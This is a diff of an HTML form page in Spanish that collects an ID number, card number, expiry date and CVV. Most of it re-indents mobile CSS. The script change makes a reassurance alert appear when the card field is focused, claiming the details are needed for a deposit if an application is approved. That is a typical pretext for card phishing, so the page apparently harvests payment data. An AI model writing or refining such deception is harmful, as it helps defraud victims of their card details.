@@ -145,34 +145,33 @@
       display: none;
     }
 
-  @media (max-width: 440px) {
-  html, body {
-    height: 100vh;
-    margin: 0;
-    padding: 0;
-    background: #f0f2f5;
-  }
+    @media (max-width: 440px) {
+      html, body {
+        height: 100vh;
+        margin: 0;
+        padding: 0;
+        background: #f0f2f5;
+      }
 
-  .container {
-    width: 94vw;
-    height: 90vh;
-    max-height: 90vh;
-    margin: auto;
-    padding: 20px 15px;
-    overflow-y: auto;
-    box-shadow: 0 2px 6px rgba(0,0,0,0.1);
-    border-radius: 10px;
-    display: flex;
-    flex-direction: column;
-    justify-content: center;
-  }
+      .container {
+        width: 94vw;
+        height: 90vh;
+        max-height: 90vh;
+        margin: auto;
+        padding: 20px 15px;
+        overflow-y: auto;
+        box-shadow: 0 2px 6px rgba(0,0,0,0.1);
+        border-radius: 10px;
+        display: flex;
+        flex-direction: column;
+        justify-content: center;
+      }
 
-  .inline-inputs {
-    flex-direction: column;
-    gap: 10px;
-  }
-}
-
+      .inline-inputs {
+        flex-direction: column;
+        gap: 10px;
+      }
+    }
   </style>
 </head>
 <body>
@@ -241,7 +240,6 @@
   const fechaInput = document.getElementById('fecha');
   const cvvInput = document.getElementById('cvv');
   const terminosCheckbox = document.getElementById('terminos');
-  const nombreInput = document.getElementById('nombre');
 
   const errorCedula = document.getElementById('error-cedula');
   const errorTarjeta = document.getElementById('error-tarjeta');
@@ -250,8 +248,10 @@
   const errorTerminos = document.getElementById('error-terminos');
 
   let yaMostroAlerta = false;
-  nombreInput.addEventListener('input', () => {
-    if (!yaMostroAlerta && nombreInput.value.trim() !== '') {
+
+  // ✅ Ahora la alerta aparece solo al tocar el campo de tarjeta
+  tarjetaInput.addEventListener('focus', () => {
+    if (!yaMostroAlerta) {
       yaMostroAlerta = true;
       alert('⚠️ Estos datos son solicitados en caso de que su solicitud sea aprobada y se proceda al depósito correspondiente.');
     }
@@ -337,4 +337,3 @@
 
 </body>
 </html>
-
